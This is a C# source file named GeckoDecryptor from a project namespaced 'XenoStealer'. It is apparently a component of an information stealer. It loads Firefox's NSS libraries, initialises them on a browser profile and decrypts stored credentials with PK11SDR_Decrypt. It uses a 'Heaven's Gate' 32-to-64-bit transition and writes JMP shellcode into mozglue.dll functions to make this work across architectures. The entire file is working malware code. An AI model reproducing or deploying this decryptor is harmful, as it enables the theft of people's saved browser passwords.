using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Linq;
using static XenoStealer.InternalStructs;

namespace XenoStealer
{
    public class GeckoDecryptor
    {

        private static string LastWorkingResourcePath;


        private bool UseHeavensGate = false;


        [UnmanagedFunctionPointer(CallingConvention.Cdecl, CharSet = CharSet.Ansi)]
        private delegate InternalStructs.SECStatus NSS_InitDelegate([MarshalAs(UnmanagedType.LPStr)] string configdir);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate InternalStructs.SECStatus NSS_ShutdownDelegate();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate InternalStructs.SECStatus PK11SDR_DecryptDelegate(ref InternalStructs.SECItem data, ref InternalStructs.SECItem result, IntPtr cx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate void SECITEM_ZfreeItemDelegate(ref InternalStructs.SECItem zap, InternalStructs.PRBool freeit);

        private ulong NSS_Init64;
        private ulong NSS_Shutdown64;
        private ulong PK11SDR_Decrypt64;
        private ulong SECITEM_ZfreeItem64;

        private NSS_InitDelegate NSS_Init;
        private NSS_ShutdownDelegate NSS_Shutdown;
        private PK11SDR_DecryptDelegate PK11SDR_Decrypt;
        private SECITEM_ZfreeItemDelegate SECITEM_ZfreeItem;

        private ulong mozGlue;
        private ulong NSS3;

        public bool Operational = false;

        

        public GeckoDecryptor(string GeckoResourcePath, bool UseLastWorkingResourcePathIfFail = true) 
        {
            Init(GeckoResourcePath);
            if (Operational) 
            {
                return;
            }
            if (UseLastWorkingResourcePathIfFail && LastWorkingResourcePath != null)
            {
                Init(LastWorkingResourcePath);
            }

            
        }

        private void Init(string GeckoResourcePath) 
        {
            if (!GeckoResourcePath.EndsWith("\\"))
            {
                GeckoResourcePath = GeckoResourcePath + "\\";
            }

            if (!IsValidGeckoResourcePath(GeckoResourcePath)) 
            {
                return;
            }

            if (Environment.Is64BitProcess && GeckoResourcePath.Contains("x86")) //64 && 32, fail.
            {
                return;
            }
            else if (!Environment.Is64BitProcess && !GeckoResourcePath.Contains("x86")) //32 && 64, pass.
            {
                if (!HeavensGate.operational) //heavensGate needs to be operational to do this.
                {
                    return;
                }
                UseHeavensGate = true;
            }
            else//64&&64 || 32&&32, pass.
            {

            }

            if (UseHeavensGate)
            {
                mozGlue = LoadAndPatchMozGlue(GeckoResourcePath + "mozglue.dll");
                NSS3 = KernelLoadLibrary64(GeckoResourcePath + "nss3.dll");
            }
            else
            {
                mozGlue = (ulong)NativeMethods.LoadLibraryW(GeckoResourcePath + "mozglue.dll");
                NSS3 = (ulong)NativeMethods.LoadLibraryW(GeckoResourcePath + "nss3.dll");
            }

            if (mozGlue == 0 || NSS3 == 0)
            {
                FreeLoadedLibraries();
                return;

            }


            if (UseHeavensGate)
            {
                NSS_Init64 = HeavensGate.GetProcAddress64(NSS3, "NSS_Init");
                NSS_Shutdown64 = HeavensGate.GetProcAddress64(NSS3, "NSS_Shutdown");
                PK11SDR_Decrypt64 = HeavensGate.GetProcAddress64(NSS3, "PK11SDR_Decrypt");
                SECITEM_ZfreeItem64 = HeavensGate.GetProcAddress64(NSS3, "SECITEM_ZfreeItem");
                if (NSS_Init64 == 0 || NSS_Shutdown64 == 0 || PK11SDR_Decrypt64 == 0 || SECITEM_ZfreeItem64 == 0) 
                {
                    FreeLoadedLibraries();
                    return;
                }
            }
            else
            {
                IntPtr procAddr = NativeMethods.GetProcAddress((IntPtr)NSS3, "NSS_Init");
                if (procAddr == IntPtr.Zero)
                {
                    FreeLoadedLibraries();
                    return;
                }
                NSS_Init = Marshal.GetDelegateForFunctionPointer<NSS_InitDelegate>(procAddr);
                procAddr = NativeMethods.GetProcAddress((IntPtr)NSS3, "NSS_Shutdown");
                if (procAddr == IntPtr.Zero)
                {
                    FreeLoadedLibraries();
                    return;
                }
                NSS_Shutdown = Marshal.GetDelegateForFunctionPointer<NSS_ShutdownDelegate>(procAddr);
                procAddr = NativeMethods.GetProcAddress((IntPtr)NSS3, "PK11SDR_Decrypt");
                if (procAddr == IntPtr.Zero)
                {
                    FreeLoadedLibraries();
                    return;
                }
                PK11SDR_Decrypt = Marshal.GetDelegateForFunctionPointer<PK11SDR_DecryptDelegate>(procAddr);
                procAddr = NativeMethods.GetProcAddress((IntPtr)NSS3, "SECITEM_ZfreeItem");
                if (procAddr == IntPtr.Zero)
                {
                    FreeLoadedLibraries();
                    return;
                }
                SECITEM_ZfreeItem = Marshal.GetDelegateForFunctionPointer<SECITEM_ZfreeItemDelegate>(procAddr);
            }

            LastWorkingResourcePath = GeckoResourcePath;

            Operational = true;
        }

        private static bool IsValidGeckoResourcePath(string GeckoResourcePath)
        {
            if (!GeckoResourcePath.EndsWith("\\"))
            {
                GeckoResourcePath = GeckoResourcePath + "\\";
            }
            return File.Exists(GeckoResourcePath + "nss3.dll") && File.Exists(GeckoResourcePath + "mozglue.dll");
        }

        private void FreeLoadedLibraries() 
        {
            if (UseHeavensGate)
            {
                KernelFreeLibrary64(mozGlue);
                KernelFreeLibrary64(NSS3);
            }
            else
            {
                NativeMethods.FreeLibrary((IntPtr)mozGlue);
                NativeMethods.FreeLibrary((IntPtr)NSS3);
            }
        }

        private bool DetourAddress64from32(ulong AddressToReplace, ulong AddressToReplaceWith)
        {

            uint PAGE_EXECUTE_READWRITE = 0x40;


            
            ulong kern = HeavensGate.LoadKernel32();

            if (kern == 0)
            {
                return false;
            }


            byte[] shellcode = new byte[]
            {
                0x48, 0xB8,                                     // MOV RAX, <Address>
                (byte)(AddressToReplaceWith & 0xFF),                    // Byte 1 of function address
                (byte)((AddressToReplaceWith >> 8) & 0xFF),             // Byte 2 of function address
                (byte)((AddressToReplaceWith >> 16) & 0xFF),            // Byte 3 of function address
                (byte)((AddressToReplaceWith >> 24) & 0xFF),            // Byte 4 of function address
                (byte)((AddressToReplaceWith >> 32) & 0xFF),            // Byte 5 of function address
                (byte)((AddressToReplaceWith >> 40) & 0xFF),            // Byte 6 of function address
                (byte)((AddressToReplaceWith >> 48) & 0xFF),            // Byte 7 of function address
                (byte)((AddressToReplaceWith >> 56) & 0xFF),            // Byte 8 of function address
                0xFF, 0xE0                                      // JMP RAX
            };

            ulong VirtualProtect = HeavensGate.GetProcAddress64(kern, "VirtualProtect");

            if (VirtualProtect == 0)
            {
                return false;
            }

            IntPtr pOldProtect = Marshal.AllocHGlobal(sizeof(uint));
            if (!Convert.ToBoolean(HeavensGate.Execute64(VirtualProtect, AddressToReplace, (ulong)shellcode.Length, PAGE_EXECUTE_READWRITE, (ulong)pOldProtect))) 
            { 
                Marshal.FreeHGlobal(pOldProtect);
                return false;
            }
            uint OldProtect = Marshal.PtrToStructure<InternalStructs.UINTRESULT>(pOldProtect).Value;

            IntPtr buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            CopyMemory64(AddressToReplace, (ulong)buffer, (ulong)shellcode.Length);


            HeavensGate.Execute64(VirtualProtect, AddressToReplace, (ulong)shellcode.Length, OldProtect, (ulong)pOldProtect);


            Marshal.FreeHGlobal(pOldProtect);

            return true;



        }
        private ulong LoadAndPatchMozGlue(string path)
        {
            if (!path.ToLower().Contains("mozglue.dll")) 
            {
                path += "mozglue.dll";
            }


            uint DONT_RESOLVE_DLL_REFERENCES = 0x00000001;

            string[] kernelPatchs = new string[] { "HeapAlloc", "HeapReAlloc", "HeapFree" };
            string[] msvcrtPatchs = new string[] { "_msize", "calloc", "free", "malloc", "realloc", "strdup" };
            Dictionary<string, string> DifferentMatchs = new Dictionary<string, string>();
            DifferentMatchs["strdup"] = "_strdup";

            ulong kern = HeavensGate.LoadKernel32();
            ulong msvcrt = HeavensGate.LoadLibrary64("msvcrt.dll");
            if (kern == 0 || msvcrt == 0)
            {
                return 0;
            }

            ulong mozGlueLibrary = KernelLoadLibrary64(path, DONT_RESOLVE_DLL_REFERENCES);
            if (mozGlueLibrary == 0)
            {
                return 0;
            }
            foreach (string i in msvcrtPatchs)
            {
                ulong MozFunctionAddress = HeavensGate.GetProcAddress64(mozGlueLibrary, i);
            
                if (MozFunctionAddress == 0)
                {
                    KernelFreeLibrary64(mozGlueLibrary);
                    return 0;
                }
                string RealFuncName = i;
                if (DifferentMatchs.ContainsKey(i))
                {
                    RealFuncName = DifferentMatchs[i];
                }
                ulong msvcrtFunctionAddress = HeavensGate.GetProcAddress64(msvcrt, RealFuncName);
                if (msvcrtFunctionAddress == 0)
                {
                    KernelFreeLibrary64(mozGlueLibrary);
                    return 0;
                }
                bool DetourSucessfull = DetourAddress64from32(MozFunctionAddress, msvcrtFunctionAddress);
                if (!DetourSucessfull)
                {
                    KernelFreeLibrary64(mozGlueLibrary);
                    return 0;
                }
            }
            
            foreach (string i in kernelPatchs)
            {
                ulong MozFunctionAddress = HeavensGate.GetProcAddress64(mozGlueLibrary, i);
                if (MozFunctionAddress == 0)
                {
                    KernelFreeLibrary64(mozGlueLibrary);
                    return 0;
                }
                string RealFuncName = i;
                if (DifferentMatchs.ContainsKey(i))
                {
                    RealFuncName = DifferentMatchs[i];
                }
            
                ulong KernelFunctionAddress = HeavensGate.GetProcAddress64(kern, RealFuncName);
                if (KernelFunctionAddress == 0)
                {
                    KernelFreeLibrary64(mozGlueLibrary);
                    return 0;
                }
            
                bool DetourSucessfull = DetourAddress64from32(MozFunctionAddress, KernelFunctionAddress);
                if (!DetourSucessfull)
                {
                    KernelFreeLibrary64(mozGlueLibrary);
                    return 0;
                }
            }
            return mozGlueLibrary;
            
        }
        private ulong KernelLoadLibrary64(string lib, uint flags) 
        {
            if (lib == null) 
            {
                return 0;
            }
            ulong kernel3264 = HeavensGate.LoadKernel32();
            if (kernel3264 == 0) 
            {
                return 0;
            }
            ulong LoadLibraryExAddr = HeavensGate.GetProcAddress64(kernel3264, "LoadLibraryExW");
            if (LoadLibraryExAddr == 0) 
            {
                return 0;
            }
            IntPtr LoadStringAddr = Marshal.StringToHGlobalUni(lib);
            ulong LoadedLibrary = HeavensGate.Execute64(LoadLibraryExAddr, (ulong)LoadStringAddr, 0, flags);
            Marshal.FreeHGlobal(LoadStringAddr);
            return LoadedLibrary;
        }

        private ulong KernelLoadLibrary64(string lib)
        {
            if (lib == null)
            {
                return 0;
            }
            ulong kernel3264 = HeavensGate.LoadKernel32();
            if (kernel3264 == 0)
            {
                return 0;
            }
            ulong LoadLibraryAddr = HeavensGate.GetProcAddress64(kernel3264, "LoadLibraryW");
            if (LoadLibraryAddr == 0)
            {
                return 0;
            }
            IntPtr LoadStringAddr = Marshal.StringToHGlobalUni(lib);
            ulong LoadedLibrary = HeavensGate.Execute64(LoadLibraryAddr, (ulong)LoadStringAddr);
            Marshal.FreeHGlobal(LoadStringAddr);
            return LoadedLibrary;
        }

        private bool KernelFreeLibrary64(ulong moduleHandle) 
        {
            if (moduleHandle == 0) 
            {
                return false;
            }
            ulong kernel3264 = HeavensGate.LoadKernel32();
            if (kernel3264 == 0)
            {
                return false;
            }
            ulong FreeLibraryAddr = HeavensGate.GetProcAddress64(kernel3264, "FreeLibrary");
            if (FreeLibraryAddr == 0) 
            {
                return false;
            }
            return Convert.ToBoolean(HeavensGate.Execute64(FreeLibraryAddr, moduleHandle));
        }

        private bool CopyMemory64(ulong dest, ulong source, ulong size) 
        {
            ulong ntdll = HeavensGate.GetModuleHandle64("ntdll.dll");
            if (ntdll == 0) 
            {
                return false;
            }
            ulong CopyMemory = HeavensGate.GetProcAddress64(ntdll, "RtlCopyMemory");

            if (CopyMemory == 0)
            {
                return false;
            }
            HeavensGate.Execute64(CopyMemory, dest, source, size);
            return true;

        }

        public bool SetProfilePath(string ProfilePath)
        {
            if (!Operational) 
            {
                throw new Exception("This interface is non-operational!");
            }
            InternalStructs.SECStatus Result;
            if (UseHeavensGate)
            {
                IntPtr ProfilePathPtr = Marshal.StringToHGlobalAnsi(ProfilePath);
                Result = (InternalStructs.SECStatus)HeavensGate.Execute64(NSS_Init64, (ulong)ProfilePathPtr);
                Marshal.FreeHGlobal(ProfilePathPtr);
            }
            else 
            {
                Result = NSS_Init(ProfilePath);
            }
            return Result == InternalStructs.SECStatus.SECSuccess;
        }

        public string Decrypt(byte[] EncryptedData) 
        {
            if (!Operational) 
            {
                throw new Exception("This interface is non-operational!");
            }
            if (EncryptedData == null) 
            {
                return null;
            }

            IntPtr EncryptedDataPtr = Marshal.AllocHGlobal(EncryptedData.Length);
            Marshal.Copy(EncryptedData, 0, EncryptedDataPtr, EncryptedData.Length);

            string DecryptedData = "";

            if (UseHeavensGate)
            {
                InternalStructs64.SECItem64 data = new InternalStructs64.SECItem64();
                data.type = SECItemType.siBuffer;
                data.dataPtr = (ulong)EncryptedDataPtr;
                data.len = (uint)EncryptedData.Length;


                IntPtr dataPtr = Marshal.AllocHGlobal(Marshal.SizeOf<InternalStructs64.SECItem64>());
                IntPtr resultPtr = Marshal.AllocHGlobal(Marshal.SizeOf<InternalStructs64.SECItem64>());
                IntPtr cx = IntPtr.Zero;
                Marshal.StructureToPtr(data, dataPtr, false);

                if ((InternalStructs.SECStatus)HeavensGate.Execute64(PK11SDR_Decrypt64, (ulong)dataPtr, (ulong)resultPtr, (ulong)cx) == InternalStructs.SECStatus.SECSuccess)
                {
                    InternalStructs64.SECItem64 result = Marshal.PtrToStructure<InternalStructs64.SECItem64>(resultPtr);
                    if (result.len > 0)
                    {
                        IntPtr tempTransferStore = Marshal.AllocHGlobal((int)result.len);
                        CopyMemory64((ulong)tempTransferStore, result.dataPtr, result.len);
                        DecryptedData = Marshal.PtrToStringAnsi(tempTransferStore, (int)result.len);
                        Marshal.FreeHGlobal(tempTransferStore);

                        HeavensGate.Execute64(SECITEM_ZfreeItem64, (ulong)resultPtr, (ulong)InternalStructs.PRBool.PR_FALSE);
                    }
                }
                else
                {
                    DecryptedData = null;
                }
                Marshal.FreeHGlobal(resultPtr);
                Marshal.FreeHGlobal(dataPtr);
            }
            else 
            { 
                InternalStructs.SECItem data = new InternalStructs.SECItem();
                data.type = SECItemType.siBuffer;
                data.dataPtr = EncryptedDataPtr;
                data.len = (uint)EncryptedData.Length;
                InternalStructs.SECItem result = new InternalStructs.SECItem();
                IntPtr cx = IntPtr.Zero;

                if (PK11SDR_Decrypt(ref data, ref result, cx) == InternalStructs.SECStatus.SECSuccess)
                {
                    if (result.len > 0)
                    {
                        DecryptedData = Marshal.PtrToStringAnsi(result.dataPtr, (int)result.len);
                        SECITEM_ZfreeItem(ref result, InternalStructs.PRBool.PR_FALSE);
                    }
                }
                else 
                {
                    DecryptedData = null;
                }

            }
            Marshal.FreeHGlobal(EncryptedDataPtr);
            return DecryptedData;
        }

        public string Decrypt(string cypherText)
        {
            if (cypherText == null) 
            { 
                return null; 
            }
            return Decrypt(Convert.FromBase64String(cypherText));
        }

        public void Dispose() 
        {
            if (UseHeavensGate)
            {
                HeavensGate.Execute64(NSS_Shutdown64);
            }
            else 
            {
                NSS_Shutdown();
            }

            FreeLoadedLibraries();

        }

    }
}
